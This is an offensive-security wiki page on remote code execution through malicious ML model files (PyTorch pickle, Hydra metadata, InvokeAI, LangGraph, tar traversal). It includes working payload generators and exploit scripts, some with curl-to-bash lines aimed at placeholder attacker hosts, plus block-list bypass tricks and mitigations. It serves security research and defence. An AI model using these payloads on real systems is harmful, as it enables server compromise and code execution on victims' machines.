# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
要点：
- 在 NeMo 的 `restore_from/from_pretrained`、uni2TS HuggingFace coders 和 FlexTok loaders 中，会在模型初始化之前触发。
- Hydra 的字符串 block-list 可以通过替代 import path 绕过（例如 `enum.bltns.eval`），或者通过应用解析的名称绕过（例如 `nemo.core.classes.common.os.system` → `posix`）。
- FlexTok 还会用 `ast.literal_eval` 解析字符串化的 metadata，从而在调用 Hydra 之前就可能导致 DoS（CPU/memory 暴涨）。

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` 是一个流行的开源 Stable-Diffusion web interface。版本 **5.3.1 – 5.4.2** 暴露了 REST endpoint `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。

在内部，该 endpoint 最终调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当提供的文件是一个 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle deserialization**。由于内容直接来自用户可控的 URL，攻击者可以在 checkpoint 中嵌入一个带有自定义 `__reduce__` 方法的恶意对象；该方法会在 **deserialization** 期间执行，从而导致 InvokeAI 服务器上的 **remote code execution (RCE)**。

该漏洞被分配为 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17 %）。

#### Exploitation walk-through

1. 创建一个恶意 checkpoint：
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 将 `payload.ckpt` 托管在你控制的 HTTP 服务器上（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发易受攻击的 endpoint（无需认证）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载该文件时，它会调用 `torch.load()` → `os.system` gadget 运行，攻击者获得在 InvokeAI 进程上下文中的代码执行。

现成的 exploit：**Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 自动化了整个流程。

#### Conditions

•  InvokeAI 5.3.1-5.4.2（scan flag 默认 **false**）
•  攻击者可访问 `/api/v2/models/install`
•  进程有执行 shell 命令的权限

#### Mitigations

* 升级到 **InvokeAI ≥ 5.4.3** – 补丁默认设置 `scan=True`，并在反序列化前执行 malware 扫描。
* 以编程方式加载 checkpoints 时，使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper。
* 对 model sources 强制执行 allow-lists / signatures，并以最小权限运行服务。

> ⚠️ 请记住，**任何** 基于 Python pickle 的格式（包括许多 `.pt`、`.pkl`、`.ckpt`、`.pth` 文件）从不可信来源反序列化时本质上都是不安全的。

---

如果必须让较旧的 InvokeAI 版本在 reverse proxy 后继续运行，一个临时的 mitigation 示例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec 通过不安全的 `torch.load` 导致 RCE (CVE-2025-23298)

NVIDIA 的 Transformers4Rec（Merlin 的一部分）暴露了一个不安全的 checkpoint loader，它直接对用户提供的路径调用 `torch.load()`。由于 `torch.load` 依赖 Python `pickle`，攻击者控制的 checkpoint 可以在反序列化期间通过 reducer 执行任意代码。

易受攻击的路径（修复前）：`transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为什么这会导致 RCE：在 Python pickle 中，一个对象可以定义 reducer（`__reduce__`/`__setstate__`），返回一个 callable 和参数。该 callable 会在 unpickling 期间被执行。如果 checkpoint 中存在这样的对象，它会在任何权重被使用之前运行。

最小恶意 checkpoint 示例：
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
交付向量和爆炸半径：
- 通过 repos、buckets 或 artifact registries 共享的 Trojanized checkpoints/models
- 自动化 resume/deploy pipelines 会自动加载 checkpoints
- 执行发生在 training/inference workers 内部，通常具有更高权限（例如 containers 中的 root）

修复：Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)（PR #802）用实现于 `transformers4rec/utils/serialization.py` 的受限、allow-listed deserializer 替换了直接的 `torch.load()`。新的 loader 会验证 types/fields，并防止在 load 期间调用任意 callables。

针对 PyTorch checkpoints 的防御性建议：
- 不要 unpickle 不受信任的数据。尽可能优先使用非可执行格式，例如 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX。
- 如果必须使用 PyTorch serialization，请确保 `weights_only=True`（新版本 PyTorch 支持），或者使用类似 Transformers4Rec patch 的自定义 allow-listed unpickler。
- 强制执行 model provenance/signatures，并对 deserialization 进行沙箱隔离（seccomp/AppArmor；非 root 用户；受限 FS 且无网络外连）。
- 在 checkpoint load 时监控 ML services 出现的意外子进程；跟踪 `torch.load()`/`pickle` 的使用。

POC 和 vulnerable/patch references：
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型：
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD 暴露了一个 `resnet` endpoint，会反序列化用户可控数据。ZDI 确认，远程 attacker 可以诱导 victim 打开恶意 page/file，让其向该 endpoint 发送精心构造的 serialized blob，并以 `root` 触发 deserialization，最终导致完全 compromise。

该 exploit flow 与典型的 pickle abuse 类似：
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
反序列化期间可达的任何 gadget（构造函数、`__setstate__`、framework callbacks 等）都可以用同样的方式武器化，不管 transport 是 HTTP、WebSocket，还是投放到受监控目录中的文件。



### LangGraph checkpointer SQLi → MessagePack RCE

这个 attack chain 很有意思，因为攻击者**不需要上传恶意 model file**。相反，应用暴露了一个 **AI-agent persistence API**（`get_state_history(..., filter=...)`），而且用户输入会进入 checkpointer query builder。

#### 1. metadata filters 中的 Structural SQLi

一个有漏洞的 SQLite pattern 看起来像：
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
值稍后才会绑定，但 `query_key` 被拼接进了 **JSON path string**，所以字典 key 中的一个 `'` 会跳出 `'$.{query_key}'` 并注入 SQL。这个教训同样适用于 **JSON paths、identifiers、operators、`LIMIT` 和 TTL fields**：占位符只能保护 values，不能保护结构化 query syntax。

#### 2. `UNION SELECT` 可以针对下游 sinks，而不只是窃取 data

该 query 返回 `type` 和序列化的 `checkpoint` bytes，随后会被消费为：
```python
self.serde.loads_typed((type, checkpoint))
```
这意味着 `WHERE` 子句中的 SQLi 可以注入一行**伪造的结果行**：
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
如果后续代码会解析、反序列化、写入或执行任何被选中的列，就把这些列映射到它们的 sink。在这种情况下，伪造的行会把 SQLi 变成 **attacker-controlled deserialization**。

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

LangGraph 的 `msgpack` 路径使用了一个自定义的扩展 hook，它会解包一个嵌套元组并执行：
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
所以，一个编码为类似于 `("os", "system", "id > /tmp/pwned")` 的 MessagePack 扩展对象会导入 `os`，解析 `system`，并运行该命令。在审查 AI frameworks 时，要检查会进行动态 imports、reflection 或任意 callable dispatch 的 **custom MessagePack/JSON/pickle revivers**。

#### 4. Practical audit pattern for agent frameworks

审查任何可由用户控制、并会传递到以下位置的输入：
- state history / memory / replay / checkpoint listing APIs
- 生成 SQL 或 Redis query 片段的结构化 filter builders
- custom deserializers（`pickle`、`msgpack`、`json` object hooks、YAML constructors）
- 信任 persistence layer 返回行的 recovery paths

这个特定链影响了使用 **SQLite** 或 **Redis** checkpointers 的自托管 LangGraph deployments，当不可信用户可以控制 `filter` 时。披露中提到的已修复版本是 `langgraph-checkpoint-sqlite 3.0.1+`、`langgraph 1.0.10+`、`langgraph-checkpoint-redis 1.0.2+` 和 `langgraph-checkpoint 4.0.1+`。

## Models to Path Traversal

如 [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) 中所述，不同 AI frameworks 使用的大多数 models formats 都基于 archives，通常是 `.zip`。因此，可能可以滥用这些格式来执行 path traversal attacks，从而读取加载模型的系统中的任意文件。

例如，使用下面的代码，你可以创建一个模型，在加载时会在 `/tmp` 目录中创建一个文件：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用以下代码，你可以创建一个在加载时会创建指向 `/tmp` 目录的 symlink 的 model：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深入解析：Keras .keras 反序列化与 gadget hunting

关于 .keras 内部结构、Lambda-layer RCE、≤ 3.8 中的任意 import 问题，以及在 allowlist 内进行修复后的 gadget 发现，请参见：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
